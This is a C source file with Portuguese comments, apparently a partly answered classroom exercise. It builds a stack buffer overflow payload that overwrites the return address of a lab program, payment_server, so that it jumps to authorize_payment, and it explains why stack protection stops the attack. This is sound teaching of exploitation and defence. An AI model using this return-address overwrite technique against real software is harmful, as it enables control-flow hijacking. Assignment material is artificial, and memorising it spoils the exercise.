/* O objetivo é fazer o Programa A, o payment_server, executar a função authorize_payment, que nenhum caminho do código de A chega a chamar, estourando o vetor received_id da função process_transaction e sobrescrevendo o endereço de retorno. Este arquivo deve FUNCIONAR -- compilar, executar e levar o Programa A a autorizar o pagamento -- e deve EXPLICAR o próprio ataque nos comentários curtos que você escreverá onde cada marca abaixo pede, pois a correção vai compilar e executar este programa contra o Programa A e ler os seus comentários para verificar se você entendeu por que o ataque funciona. */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void)
{
    /* [1] Explique, em uma ou duas linhas, por que o Programa A pode ser atacado: o que, na forma como ele recebe o identificador da transação, permite que a escrita ultrapasse o fim do vetor de destino. */
    /* Resposta: O Programa A recebe o transaction_id através de argv[1] e usa strcpy() para copiá-lo para um vetor de apenas 16 bytes, sem verificar o tamanho da entrada. Assim, uma entrada maior pode ultrapassar os limites de received_id e sobrescrever dados da pilha.*/

    /* [2] Descubra o endereço da função authorize_payment no Programa A, com o comando print &authorize_payment no gdb ou com o utilitário nm, e anote qual é a função e como você chegou a esse valor. */
    /* Resposta: */
    unsigned long target = 0x401156 ;   /* <-- substitua pelo endereço real */
	/*MUDANÇA AQUI NO EN*/
    /* [3] Meça quantos bytes separam o início do vetor do endereço de retorno e anote o que ocupa o espaço entre os dois. */
    /* Resposta: */
    int offset = 24;               /* <-- substitua pela distância real */

    char payload[64];
    int i;

    /* preenche o vetor até o endereço de retorno */
    for (i = 0; i < offset; i++)
        payload[i] = 'A';

    /* [4] Escreva o endereço-alvo por cima do endereço de retorno, um byte de cada vez, do menos significativo para o mais significativo, na ordem little-endian. O endereço de authorize_payment é baixo, então os seus bytes mais altos são zero. Escreva apenas os bytes baixos diferentes de zero e deixe o terminador completar o resto. */
     payload[offset + 0] = 0x56;
     payload[offset + 1] = 0x11;
     payload[offset + 2] = 0x40;
     payload[offset + 3] = '\0';

    /* dispara o Programa A com o identificador de transação forjado */
    char *args[] = { "./payment_server", payload, NULL };
    execv("./payment_server", args);
    perror("execv");
    return 1;
}

/* [5] Recompile o Programa A SEM a opção -fno-stack-protector assim que o seu ataque funcionar, execute este mesmo Programa B contra ele e registre o que muda e o que a mensagem que passa a aparecer revela sobre o que a proteção de pilha faz. */
/* Resposta: */
/*
* Depois da recompilação do Programa A com a proteção de pilha habilitada,
 * o comportamento muda porque o compilador insere uma proteção entre os
 * dados locais da função e o mecanismo de retorno. Quando o conteúdo da
 * pilha é corrompido, a proteção detecta a alteração e interrompe o
 * programa em vez de permitir normalmente o retorno para o endereço
 * sobrescrito.*/
